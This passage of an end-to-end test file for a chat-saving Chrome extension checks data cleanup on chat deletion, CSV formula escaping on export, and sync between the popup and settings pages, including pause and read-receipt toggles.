      const dup = { notifications: (await db.getAll('notifications')).length - n0, events: (await db.getAll('events')).length - e0 };
      await db.deleteThread('chatB', { name: '' });
      return { afterA, dup, mediaAfterB: !!(await db.getMedia('fbid:shared')) };
    });
    assert.deepEqual(r.afterA, { mediaStillThere: true, eventsWithA: 0, notifWithA: 0, pendingForA: 0 });
    assert.deepEqual(r.dup, { notifications: 0, events: 0 });
    assert.equal(r.mediaAfterB, false, 'photo removed once no chat uses it');

    // CSV: a message starting with "=" is written as text, not as a formula
    await dash.evaluate(async () => {
      const db = await import('/lib/db.js');
      await db.withStores(['messages'], 'readwrite', async (s) => s.messages.put(db.finalizeMessage({ key: 'dm:F1', threadKey: 'chatF', text: '=1+1', ts: Date.now(), capturedAt: Date.now(), attachments: [], history: [], sources: ['screen'] })));
    });
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
    const [download] = await Promise.all([dash.waitForEvent('download'), dash.click('#export-csv')]);
    const csv = fs.readFileSync(await download.path(), 'utf8');
    assert.ok(csv.includes("'=1+1"), 'formula neutralised: ' + csv.split('\n').find((l) => l.includes('1+1')));
  });

  await t.test('UX: popup hint only when needed, paused state is honest, deletes clear the screen, settings stay in sync', async () => {
    const popup = await ctx.newPage();
    popup.on('pageerror', (e) => errors.push('popup: ' + e.message));
    await popup.setViewportSize({ width: 360, height: 600 });
    await popup.goto(`chrome-extension://${extId}/popup/popup.html`);
    await popup.waitForTimeout(1600);
    assert.equal(await popup.isVisible('#reload-hint'), false, 'no false "reload this tab" warning');
    assert.equal(await popup.isVisible('#open-dashboard'), true, 'main button visible within 600 px');

    // pause from the popup: switches lock, the note explains, Seen is no longer held back
    await popup.click('header .switch input[data-setting="enabled"]');
    await waitFor(async () => popup.isVisible('#paused-note'), { what: 'paused note' });
    assert.equal(await popup.isDisabled('input[data-setting="blockSeen"]'), true);

    // the Settings page follows at once
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
    await waitFor(async () => dash.isVisible('#paused-banner'), { what: 'paused banner on the Saved Messages page' });
    await popup.click('header .switch input[data-setting="enabled"]');
    await waitFor(async () => !(await dash.isVisible('#paused-banner')), { what: 'banner gone after resuming' });
    await popup.click('input[data-setting="blockSeen"]');
    await waitFor(async () => !(await dash.isChecked('#view-settings input[data-setting="blockSeen"]')), { what: 'settings page shows the popup change' });
    assert.equal(await dash.isDisabled('#view-settings input[data-setting="stealthFocus"]'), true, 'Strong mode locked while Unseen is off');
    await popup.click('input[data-setting="blockSeen"]');
    await popup.close();

    // deleting a chat clears it from the screen
    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#thread=200000000000001`);
    await waitFor(async () => (await dash.textContent('#thread-messages')).includes('4321'), { what: 'Bob chat open' });
    dash.once('dialog', () => {});
    await dash.click('#delete-thread');
    await dash.click('#confirm-ok');
    await waitFor(async () => !(await dash.textContent('#thread-messages')).includes('4321'), { what: 'deleted chat no longer on screen' });

    // Chrome's "Options" entry opens Settings
    const opt = await ctx.newPage();
    await opt.goto(`chrome-extension://${extId}/dashboard/options.html`);
    await waitFor(async () => opt.url().endsWith('#settings') && (await opt.isVisible('#view-settings')), { what: 'options -> settings' });
    await opt.close();
  });

  await t.test('no script errors anywhere', async () => {
    assert.deepEqual(errors, []);
  });
});
